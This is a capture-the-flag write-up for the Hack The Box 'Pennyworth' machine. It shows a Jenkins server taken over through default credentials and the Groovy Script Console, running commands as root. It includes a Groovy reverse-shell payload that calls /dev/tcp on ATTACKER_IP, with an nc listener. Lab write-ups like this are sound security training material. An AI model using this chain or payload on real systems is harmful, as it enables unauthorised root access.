# HTB Pennyworth — Full Writeup

**Platform:** Hack The Box  
**Difficulty:** Very Easy  
**OS:** Linux  
**Category:** Starting Point  
**Status:** Retired  

---

## Overview

Pennyworth is a very easy Linux machine running a Jenkins automation server on Jetty. The Jenkins instance is accessible with default credentials, exposing the built-in Groovy Script Console. Since Jenkins runs as root, executing Groovy code via the Script Console provides immediate, unauthenticated-equivalent remote code execution with full system privileges.

**Full chain:**
```
Default credentials on Jenkins login
  → Groovy Script Console (/script)
    → Arbitrary command execution as root
```

---

## Reconnaissance

### Port Scan

```bash
nmap -sC -sV -oN Pennyworth_nmap.txt 10.129.18.179
```

| Port | Service | Version |
|------|---------|---------|
| 8080 | HTTP | Jetty 9.4.39.v20210325 |

A `robots.txt` file is present with one disallowed entry (`/`). The HTTP server header confirms Jetty, which is the default embedded servlet container for Jenkins.

### Web Enumeration

Visiting `http://10.129.18.179:8080` presents a **Jenkins login page**. Testing common default credentials succeeds:

| Username | Password |
|----------|----------|
| `root` | `password` |

---

## Step 1 — Remote Code Execution via Groovy Script Console

### Vulnerability

Jenkins includes a **Script Console** at `/script` that accepts arbitrary Groovy code and executes it on the server. This is an intentional administrative feature, not a bug — but when paired with weak credentials and Jenkins running as root, it provides trivial full-system compromise.

### Exploit

Navigate to `http://10.129.18.179:8080/script` and execute:

```groovy
println "whoami".execute().text
```

Result:
```
root
```

Jenkins is running as root. Read the flag:

```groovy
println "cat /root/flag.txt".execute().text
```

### Reverse Shell (alternative path)

For a full interactive shell, use the Script Console to launch a reverse connection:

```groovy
String host = "ATTACKER_IP"
int port = 4444
String cmd = "/bin/bash"
Process p = new ProcessBuilder(["bash", "-c", "bash -i >& /dev/tcp/${host}/${port} 0>&1"]).redirectErrorStream(true).start()
```

With a listener on the attacker machine:

```bash
nc -lvnp 4444
```

---

## Flag

| Flag | Location |
|------|----------|
| flag.txt | `/root/flag.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| Web browser | Accessing Jenkins dashboard and Script Console |

---

## Key Takeaways

**Default credentials are still the easiest way in** — Jenkins was fully compromised without exploiting a single CVE. Weak credentials on an internet-facing admin panel gave immediate access to a code execution feature.

**Jenkins Script Console is a built-in shell** — The Groovy Script Console is not a vulnerability; it is a documented feature. Any user with access to it has full control of the host. Access should be restricted to trusted administrators and never exposed to untrusted networks.

**Services should not run as root** — Jenkins running as root means the Script Console grants immediate full-system access. Running Jenkins under a dedicated unprivileged user would limit the impact of compromised credentials to the Jenkins workspace only.
